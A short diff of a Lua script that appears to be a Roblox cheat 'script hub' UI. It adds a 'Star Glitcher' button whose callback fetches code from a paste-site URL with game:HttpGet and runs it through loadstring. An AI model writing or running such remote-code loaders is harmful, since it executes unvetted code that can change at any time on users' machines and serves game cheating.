@@ -67,6 +67,6 @@ local Tab6 = Window:CreateTab("The Sigma studi hub try now", 4483362458) -- Titl
 
 local Button = Tab1:CreateButton({
 Name = "Star Glitcher",
-Callback = function()
+Callback = function() loadstring(game:HttpGet("https://pastefy.app/QXyngZEA/raw"))()
    end
 )}
